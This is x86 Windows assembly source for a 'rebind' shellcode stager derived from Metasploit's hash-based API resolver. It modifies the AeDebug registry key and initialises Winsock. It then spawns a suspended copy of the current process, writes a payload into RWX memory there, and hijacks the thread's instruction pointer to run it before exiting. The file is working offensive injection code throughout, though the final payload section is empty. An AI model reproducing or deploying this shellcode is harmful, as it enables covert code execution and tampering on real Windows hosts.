;
; Rebind shellcode 
; Use Stephen Fewer hashing algorithm to dynamically find addresses of API methods
;
; Code uses techniques from
; - https://github.com/BorjaMerino/Windows-One-Way-Stagers/blob/master/Rebind-Socket/migrate_rebind_socket.asm
; - https://raw.githubusercontent.com/rapid7/metasploit-framework/master/external/source/shellcode/windows/x86/src/block/block_api.asm
;
[BITS 32]

cld
call start

; Input: The hash of the API to call and all its parameters must be pushed onto stack.
; Output: The return value from the API call will be in EAX.
; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)
; Un-Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un-clobbered.
; Note: This function assumes the direction flag has allready been cleared via a CLD instruction.
; Note: This function is unable to call forwarded exports.

api_call:
  pushad                     ; We preserve all the registers for the caller, bar EAX and ECX.
  mov ebp, esp               ; Create a new stack frame
  xor edx, edx               ; Zero EDX
  mov edx, [fs:edx+0x30]     ; Get a pointer to the PEB
  mov edx, [edx+0xc]         ; Get PEB->Ldr
  mov edx, [edx+0x14]        ; Get the first module from the InMemoryOrder module list

next_mod:                    ;
  mov esi, [edx+0x28]        ; Get pointer to modules name (unicode string)
  movzx ecx, word [edx+0x26] ; Set ECX to the length we want to check
  xor edi, edi               ; Clear EDI which will store the hash of the module name

loop_modname:                ;
  xor eax, eax               ; Clear EAX
  lodsb                      ; Read in the next byte of the name
  cmp al, 'a'                ; Some versions of Windows use lower case module names
  jl not_lowercase           ;
  sub al, 0x20               ; If so normalise to uppercase

not_lowercase:               ;
  ror edi, 0xd               ; Rotate right our hash value
  add edi, eax               ; Add the next byte of the name
  dec ecx
  jnz loop_modname           ; Loop until we have read enough
  ; We now have the module hash computed
  push edx                   ; Save the current position in the module list for later
  push edi                   ; Save the current module hash for later
  ; Proceed to iterate the export address table,
  mov edx, [edx+0x10]        ; Get this modules base address
  mov eax, [edx+0x3c]        ; Get PE header
  add eax, edx               ; Add the modules base address
  mov eax, [eax+0x78]        ; Get export tables RVA
  test eax, eax              ; Test if no export address table is present
  jz get_next_mod1           ; If no EAT present, process the next module
  add eax, edx               ; Add the modules base address
  push eax                   ; Save the current modules EAT
  mov ecx, [eax+0x18]        ; Get the number of function names
  mov ebx, [eax+0x20]        ; Get the rva of the function names
  add ebx, edx               ; Add the modules base address

; Computing the module hash + function hash
get_next_func:               ;
  test ecx, ecx              ; Changed from jecxz to accomodate the larger offset produced by random jmps below
  jz get_next_mod            ; When we reach the start of the EAT (we search backwards), process the next module
  dec ecx                    ; Decrement the function name counter
  mov esi, [ebx+ecx*4]       ; Get rva of next module name
  add esi, edx               ; Add the modules base address
  xor edi, edi               ; Clear EDI which will store the hash of the function name

; And compare it to the one we want
loop_funcname:               ;
  xor eax, eax               ; Clear EAX
  lodsb                      ; Read in the next byte of the ASCII function name
  ror edi, 0xd               ; Rotate right our hash value
  add edi, eax               ; Add the next byte of the name
  cmp al, ah                 ; Compare AL (the next byte from the name) to AH (null)
  jne loop_funcname          ; If we have not reached the null terminator, continue
  add edi, [ebp-8]           ; Add the current module hash to the function hash
  cmp edi, [ebp+0x24]        ; Compare the hash to the one we are searchnig for
  jnz get_next_func          ; Go compute the next function hash if we have not found it
  ; If found, fix up stack, call the function and then value else compute the next one...
  pop eax                    ; Restore the current modules EAT
  mov ebx, [eax+0x24]        ; Get the ordinal table rva
  add ebx, edx               ; Add the modules base address
  mov cx, [ebx+2*ecx]        ; Get the desired functions ordinal
  mov ebx, [eax+0x1c]        ; Get the function addresses table rva
  add ebx, edx               ; Add the modules base address
  mov eax, [ebx+4*ecx]       ; Get the desired functions RVA
  add eax, edx               ; Add the modules base address to get the functions actual VA

; We now fix up the stack and perform the call to the desired function...
finish:
  mov [esp+0x24], eax        ; Overwrite the old EAX value with the desired api address for the upcoming popad
  pop ebx                    ; Clear off the current modules hash
  pop ebx                    ; Clear off the current position in the module list
  popad                      ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
  pop ecx                    ; Pop off the origional return address our caller will have pushed
  pop edx                    ; Pop off the hash value our caller will have pushed
  push ecx                   ; Push back the correct return value
  jmp eax                    ; Jump into the required function

; We now automagically return to the correct caller...
get_next_mod:                ;
  pop eax                    ; Pop off the current (now the previous) modules EAT

get_next_mod1:               ;
  pop edi                    ; Pop off the current (now the previous) modules hash
  pop edx                    ; Restore our position in the module list
  mov edx, [edx]             ; Get the next module
  jmp next_mod               ; Process this module

;
; Begin Rebind Shellcode 
;

start:
  pop ebp                    ; pop off the address of 'api_call' for calling later

  push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
  push 0x5F327377        ; ...
  push esp               ; Push a pointer to the "ws2_32" string on the stack.
  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp               ; LoadLibraryA( "ws2_32" )

; LoadLibrary(advapi31)
; https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
  xor ebx, ebx
  push ebx                   ; push null terminator
  push 0x32336970            ; advapi32 in reverse
  push 0x61766461
  push esp                   ; push pointer to advapi32
  push 0x0726774C            ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp

; for the handle
  xor edx, edx
  mov edi, esp               ; edi is un-clobbered
  mov dword [edi], edx
  sub esp, 0x10              ; avoid handle being overwritten

; 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug'
  push 0x00000000
  push 0x67756265
  push 0x4465415c
  push 0x6e6f6973
  push 0x72655674
  push 0x6e657272
  push 0x75435c54
  push 0x4e207377
  push 0x6f646e69
  push 0x575c7466
  push 0x6f736f72
  push 0x63694d5c
  push 0x45524157
  push 0x54464f53
  mov edx, esp

; https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa
; https://www.pinvoke.net/default.aspx/advapi32/RegCreateKeyA.html
  xor eax, eax
  push eax              ; pDisposion = NULL
  push edi              ; pHandle
  push eax              ; pSecurity = NULL
  push 0x0f003f         ; Access = KEY_ALL_ACCESS
  push eax              ; Options = REG_OPTION_NON_VOLATILE
  push eax              ; Class = NULL
  push eax              ; Reserved = NULL
  push edx              ; Subkey
  push 0x80000002       ; hkey = HKEY_LOCAL_MACHINE
  push 0x18355858       ; hash("advapi32.dll", "RegCreateKeyExA")
  call ebp

; 'Auto'
  push 0x00000000
  push 0x6f747541
  mov edx, esp

; RegSetValue buffer = 0
  xor ecx, ecx
  push ecx
  mov ecx, esp

; https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa
; https://www.pinvoke.net/default.aspx/advapi32.reggetvalue
  xor eax, eax
  push eax              ; cbData - size of REG_SZ value
  push ecx              ; lpData - pointer to data (0)
  push 0x1              ; dwType - REG_SZ
  push eax              ; Reserved - must by Null
  push edx              ; lpValueName (fDenyTSConnections)
  push dword [edi]      ; hKey
  push 0xB97A6615       ; hash("advapi32.dll", "RegSetValueExA")
  call ebp

; Close handle to Key
  push dword [edi]      ; hKey
  push 0x81C2AC44       ; hash("advapi32.dll", "RegCloseKey")
  call ebp

  mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
  sub esp, eax           ; alloc some space for the WSAData structure
  push esp               ; push a pointer to this stuct
  push eax               ; push the wVersionRequested parameter
  push 0x006B8029        ; hash( "ws2_32.dll", "WSAStartup" )
  call ebp               ; WSAStartup( 0x0190, &WSAData );

  xor eax, eax
  mov eax, [fs:0x30 + eax]  ; PEB
  mov eax, [ds:eax+0x10]    ; _RTL_USER_PROCESS_PARAMETERS* ProcessParameters;
  mov esi, [ds:eax+0x74]    ; Path Binary
  add esp,-400              ; adjust the stack to avoid corruption
  lea edx,[esp+0x60]
  push edx
  push 0xB16B4AB1           ; hash( "kernel32.dll", "GetStartupInfoA" )
  call ebp                  ; GetStartupInfoA( &si );

  lea eax,[esp+0x60]        ; Put startupinfo pointer back in eax
  mov [eax+0x4], ecx        ; Clean lpReserved (change me)
  mov [eax+0x8], ecx        ; Clean lpDesktop (change me)
  mov [eax+0xC], ecx        ; Clean lpTitle (change me)
  lea edi,[eax+0x60]        ; Offset of empty space for lpProcessInformation
  push edi                  ; lpProcessInformation : write processinfo here
  push eax                  ; lpStartupInfo : current info (read)
  xor ebx,ebx
  push ebx                  ; lpCurrentDirectory
  push ebx                  ; lpEnvironment
  push 0x08000004           ; dwCreationFlags CREATE_NO_WINDOW | CREATE_SUSPENDED
  push ebx                  ; bInHeritHandles
  push ebx                  ; lpThreadAttributes
  push ebx                  ; lpProcessAttributes
  push esi                  ; lpCommandLine
  push ebx                  ; lpApplicationName
  push 0x86EFCC79           ; hash( "kernel32.dll", "CreateProcessW" )
  call ebp                  ; CreateProcessW( &si );

  ; if we didn't get a new process, use this one
  test eax,eax
  jz payload                ; If process creation failed, jump to shellcode

  push 0x40                 ; RWX
  add bh, 0x10              ; ebx = 0x1000
  push ebx                  ; MEM_COMMIT
  mov ebx, 0x253            ; Bufer size
  push ebx                  
  xor ebx,ebx
  push ebx                  ; address
  push dword [edi]          ; handle
  push 0x3F9287AE           ; hash( "kernel32.dll", "VirtualAllocEx" )
  call ebp                  ; VirtualAllocEx( ...);
  ; eax now contains the destination

  push esp                  ; lpNumberOfBytesWritten
  push 0x253                ; nSize                                  

  ; pick up pointer to shellcode & keep it on stack
  jmp begin_of_payload

  begin_of_payload_return:  ; lpBuffer
  push eax                  ; lpBaseAddress
  XCHG eax, esi             ; record base address
  push dword [edi]          ; hProcess
  push 0xE7BDD8C5           ; hash( "kernel32.dll", "WriteProcessMemory" )
  call ebp                  ; WriteProcessMemory( ...)

  ; Let's Thread Hijack
  mov ebx, dword [edi+0x4]
  push 0x10001
  push esp                  ; lpContext
  push ebx                  ; hThread
  push 0xD1425C18           ; hash( "kernel32.dll", "GetThreadContext" ) 
  call ebp                  ; GetThreadContext( ...);

  xor ecx, ecx
  mov ecx, 0xb8
  mov dword [esp+ecx], esi ; Change EIP Context 
;  mov dword [esp+0xB8], esi ; Change EIP Context 
  push esp                  ; lpContext
  push ebx                  ; hThread
  push 0xD14E5C18           ; hash( "kernel32.dll", "SetThreadContext" ) 
  call ebp

  push ebx                  ; hThread
  push 0x8EF4092B           ; hash( "kernel32.dll", "ResumeThread" ) 
  call ebp

  ; End the current process to release socket
  xor eax, eax
  push eax
  push 0x56A2B5F0           ; ExitProcess(0)
  call ebp

begin_of_payload:
  call begin_of_payload_return

payload:
